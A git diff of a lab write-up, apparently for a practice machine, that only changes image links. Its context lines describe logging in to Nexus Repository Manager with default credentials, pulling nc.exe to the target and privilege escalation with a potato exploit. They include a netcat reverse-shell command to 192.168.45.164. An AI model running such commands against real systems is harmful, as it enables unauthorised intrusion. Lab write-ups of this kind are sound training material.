@@ -38,7 +38,7 @@ To avoid making this long:
 
 Port 8081 had a Nexus Repository Manager that was running:
 
-<figure><img src="../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
 
 To exploit this, we first need to guess the credentials to login. `nexus:nexus` works for this one. Then, we need to grab the correct exploit:
 
@@ -64,7 +64,7 @@ Then, we can
 
 Then, we can execute the script once to download `nc.exe` onto the machine, and another to execute `nc.exe` to get a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -98,8 +98,8 @@ However, `PrintSpoofer.exe` wasn't working normally, so we probably need to use 
 .\potato.exe -cmd "C:\Windows\Tasks\nc.exe 192.168.45.164 4444 -e cmd.exe"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
 
 For some reason, this user was unable to run `whoami`, so I just captured the flag instead:
 
-![](<../../../.gitbook/assets/image (152).png>)
+![](<../../../.gitbook/assets/image (73).png>)
